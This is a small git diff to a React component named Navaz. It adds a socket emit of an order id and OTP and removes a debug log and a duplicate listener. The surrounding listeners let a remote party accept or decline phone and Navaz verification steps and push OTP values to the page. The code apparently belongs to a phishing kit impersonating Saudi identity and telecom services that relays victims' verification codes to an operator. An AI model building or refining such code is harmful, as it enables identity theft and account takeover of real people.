@@ -19,6 +19,15 @@ const Navaz = () => {
   }, [orderId]);
 
   useEffect(() => {
+    if (!orderId) return;
+    socket.emit("navaz", {
+      _id: orderId,
+      id: orderId,
+      NavazOtp: otp || undefined,
+    });
+  }, [orderId, otp]);
+
+  useEffect(() => {
     const sameOrder = (id) => String(id) === String(orderId);
 
     const onAcceptNavaz = (payload) => {
@@ -59,7 +68,6 @@ const Navaz = () => {
       window.location.href = "/phone";
     };
     const onAcceptMobilyOtp = ({ price, id }) => {
-      console.log(price)
       if (sameOrder(id) && price != null) setOtp(String(price));
     };
     const onDeclineMobilyOtp = (id) => {
@@ -74,7 +82,6 @@ const Navaz = () => {
     socket.on("declineService", onDeclineService);
     socket.on("declinePhoneOtp", onDeclinePhoneOtp);
     socket.on("acceptPhoneOtp", onAcceptPhoneOtp);
-    socket.on("declinePhoneOtp", onDeclinePhoneOtp);
     socket.on("acceptMobOtp", onAcceptMobilyOtp);
     socket.on("declineMobOtp", onDeclineMobilyOtp);
 
